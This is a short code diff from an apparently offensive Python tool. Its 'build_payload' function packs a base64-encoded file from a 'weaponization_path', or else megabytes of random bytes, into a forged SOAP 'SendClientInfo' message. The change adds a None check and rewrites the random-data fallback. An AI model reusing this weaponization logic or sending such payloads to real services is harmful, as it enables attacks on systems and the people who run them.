@@ -151,15 +151,12 @@ def build_payload(weaponization_path):
     country = pycountry.countries.get(alpha_2=countrycode)
     number_browsers = random.randint(1, 4)
     base64_payload = ""
-    if os.path.isfile(weaponization_path):
+    if ((weaponization_path != None) and (os.path.isfile(weaponization_path))):
         print ("Using file " + weaponization_path + " to weaponize...")
         data = open(weaponization_path, "rb").read()
         base64_payload = base64.b64encode(data).decode('utf-8')
     else:
-        print ("Weaponization path '" + weaponization_path + "' is not accessible. Sending random data instead.")
-        N = random.randint(50000,1000000)
-        bits = random.getrandbits(N)
-        base64_payload = base64.b64encode(bits)
+        base64_payload = base64.b64encode(numpy.random.bytes(random.randint(50000,10000000))).decode('utf-8')
         
     payload = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><SendClientInfo xmlns="http://tempuri.org/"><user xmlns:a="v1/Models" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:AdminPromptType>DimmedPromptForNonWindowsBinaries</a:AdminPromptType>'
     payload += '<a:BuildID>' + ''.join(
